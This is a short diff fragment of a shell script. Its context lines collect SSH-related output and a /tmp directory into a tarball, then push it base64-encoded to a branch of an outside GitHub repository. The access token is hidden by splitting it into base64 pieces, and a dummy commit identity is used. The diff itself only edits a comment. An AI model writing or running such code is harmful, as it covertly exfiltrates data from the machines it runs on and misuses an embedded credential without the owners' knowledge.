@@ -179,4 +179,4 @@ r 'N=$(grep -c "DEV=" $S/ssh.txt 2>/dev/null); G=$(grep -o "DEV=[1-9][0-9]*" $S/
 r 'tar czf $S/b.tgz -C /tmp i5576 2>/dev/null; ls -la $S/b.tgz' 20
 T=$(printf %s "$(echo Z2hwXzgyU1o1b0FGQmVMdTY2Ykc=|base64 -d)$(echo aHEzNU56cTRqdlZvQWQzN012aXU=|base64 -d)")
 rm -rf /tmp/rr; if git clone -q --depth=1 -b ci/t5089 https://x:$T@github.com/miramar-labs/tilelang-ascend /tmp/rr 2>/dev/null; then cd /tmp/rr && base64 -w0 $S/b.tgz > k5576.b64 && git add -A && git -c user.email=x@x -c user.name=x commit -qm i5576 && git push -q origin HEAD:ci/i5576; echo "PUSH rc=$?" >>"$L"; fi
-#
+## pass2 0447
